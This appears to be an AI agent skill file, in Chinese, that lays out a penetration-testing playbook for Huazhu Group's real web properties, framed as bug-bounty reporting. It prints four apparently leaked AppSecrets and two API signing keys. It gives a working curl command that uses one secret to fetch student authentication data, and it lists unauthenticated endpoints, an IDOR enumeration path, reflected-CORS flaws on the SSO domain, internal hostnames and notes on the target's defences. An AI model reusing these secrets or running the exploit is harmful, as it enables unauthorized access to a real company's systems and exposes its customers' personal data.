---
name: huazhu-src-patterns
description: 华住集团SRC渗透测试模式 - APISIX网关+CAS SSO+cjia AppSecret攻击链+补天报告格式
tags:
  - src
  - huazhu
  - apisix
  - cors
  - appsecret
---

# 华住集团SRC渗透测试模式

## 目标范围
- *.huazhu.com / *.hworld.com / *.cjia.com

## 技术栈
- API网关: Apache APISIX
- Web: Tengine / OpenResty 1.17.8.2
- 后端: Spring Boot + Spring Web Flow
- SSO: Apereo CAS (idp.huazhu.com)
- 监控: Dianping CAT + Datadog + Guance
- 前端: Next.js / Vue.js / React
- 城家公寓: 自研 com.cjia.cas.baseservice

## 严重漏洞: cjia.com AppSecret→用户数据

### 攻击链
前端JS泄露AppSecret → 构造X-Cjia-Authorization头 → 未授权访问用户数据

### 泄露的AppSecret(4端)
| 端 | appCode | AppSecret |
|----|---------|-----------|
| H5 | tenant-H5 | X8MpZJTnwuUKPF2A |
| 微信小程序 | tenant-wechat-miniprogram | 49fSTptRZQuNvLns |
| 支付宝 | tenant-alipay-miniprogram | mOLoNpteZNctVnT7 |
| 微信H5 | tenant-wechat-h5 | 6vgijoGpONBIUfbs |

### API签名密钥
- d2f2dab10ac3cda7037c73cdd0b3ed8b
- 69bde68c5cb130ca7f3a95c435d0964c

### JS源码位置
`https://image.cjiahome.com/cfe-projects/cjlive/0.2.0_453/js/index.d8f09ccc.js`

### 利用命令
```bash
AUTH="Basic $(echo -n 'tenant-H5:X8MpZJTnwuUKPF2A' | base64)"
curl -sk -X POST "https://m.cjia.com/svr/user/auth/4c/searchAuthStudentList4c/0" \
    -H "Content-Type: application/json" \
    -H "X-Cjia-Authorization: $AUTH" \
    -H "attach-info: {\"clientId\":\"test\",\"appCode\":\"tenant-H5\",\"exSourceId\":\"CJIA\"}" \
    -d '{}'
```

### 未授权端点清单
| 端点 | 方法 | 返回 |
|------|------|------|
| /svr/base/common/userIp | GET | 用户真实IP |
| /svr/base/client/currentTime | GET | 服务器时间戳 |
| /svr/user/auth/4c/searchAuthStudentList4c/0 | POST | 学生认证数据 |
| /svr/base/fileServer/anonymous/signature | POST | 文件上传签名 |
| /svr/base/wxbase/authorization/buildURL | POST | 微信OAuth URL |

## 高危: franchise-cmsapi 未授权+IDOR
- 域名: franchise-cmsapi.huazhu.com
- /brand/brand/list?rows=100&page=1 → 296条品牌数据(183KB)
- /brand/brand/{id} → IDOR遍历
- /brand/tool/sendvalidcodesms → 短信接口结构泄露

## 高危: SSO CORS反射型
- 域名: signin.hworld.com
- 任意Origin反射 + Credentials=true + Allow-Headers:*
- 影响所有华住子系统认证

## 高危: htravelserver CORS反射型
- 域名: htravelserver.huazhu.com (商旅API后端)
- Origin反射 + Credentials=true + Server: APISIX
- API: /api/v1/hotel, /order, /booking, /user, /member

## 中危: CAS登录栈泄露
- 域名: idp.huazhu.com
- 触发: POST JSON到/login
- 泄露: Apereo CAS + Spring Boot + Tomcat + com.hzgroup.hzframework + CAT + Datadog

## 中危: 测试环境暴露
- 域名: test-htravel.huazhu.com
- 泄露: AMap密钥 + Duhu sec_id + APM Plus token + 内部测试域名

## 中危: 后台管理系统暴露
- 域名: hxr.huazhu.com
- 标题: "后台管理系统"
- Apache Tomcat/7.0.53 (2014年版本)
- 人工监控: /onlineMonitor/monitor/index.html

## 内部域名清单
| 域名 | 用途 |
|------|------|
| htravelserver.huazhu.com | 商旅API后端 |
| hpassport-api.huazhu.com | SSO API |
| hweb-order.huazhu.com | 订单系统 |
| hweb-personalcenter.huazhu.com | 个人中心 |
| hweb-hotel.huazhu.com | 酒店系统 |
| newwxapi.huazhu.com | 微信API |
| qiyehao.huazhu.com | 企业号 |
| duhu.huazhu.com | 设备指纹 |
| apm-api.huazhu.com | APM监控 |

## 防御特征
- APISIX网关: 所有公网服务统一入口
- WAF: Actuator端点返回501(APISIX)或405(阿里云WAF)
- OpenRASP: hxr.huazhu.com受保护
- VPN检测: 返回418"检测到当前网络不安全"
- Guance追踪: guance_trace_id头

## 补天SRC报告格式要点
- 标题: 厂商名+系统名+漏洞类型+危害
- 必填: 域名、漏洞类型、等级、行业、地址(精确到区)、漏洞URL
- 纯文本，不用HTML
- 等级: 严重(RCE/数据泄露) 高危(SQLi/CORS/未授权) 中危(信息泄露/栈泄露) 低危(版本泄露)
